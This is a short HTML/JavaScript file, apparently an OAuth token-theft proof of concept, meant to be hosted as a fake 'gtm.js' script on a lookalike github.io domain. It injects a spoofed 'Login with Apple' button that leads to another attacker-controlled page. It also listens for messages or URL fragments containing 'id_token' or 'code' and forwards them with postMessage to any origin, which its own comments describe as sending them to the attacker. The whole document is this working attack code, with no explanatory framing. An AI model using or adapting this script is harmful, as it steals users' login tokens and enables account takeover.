<!-- Save this file as: https://subs-redditt.github.io/gtm.js -->

<script>
var state = new URLSearchParams(parent.location.search).get('state') || 'defaultstate';

if (!window.inited) {
    window.inited = true;

    // Simulate injecting a fake button
    var d = document.createElement('div');
    d.innerHTML = `
        <h2 style="color:red;">Test Login Simulation</h2>
        <a href="https://oauthtest444.github.io/redditt.github.io/?state=${encodeURIComponent(state)}" 
           target="_blank" style="font-size:18px;color:white;background:red;padding:10px;">
           Click here to "Login with Apple" (Test)
        </a>
    `;
    document.body.appendChild(d);

    // Listen for token and send back to attacker
    window.addEventListener('message', function(e) {
        if (e.data && (e.data.includes('id_token') || e.data.includes('code'))) {
            top.postMessage(e.data, '*');   // Send to attacker page
        }
    });

    // Auto forward if token is in URL fragment
    if (location.hash.includes('id_token')) {
        top.postMessage(location.hash, '*');
    }
}
</script>
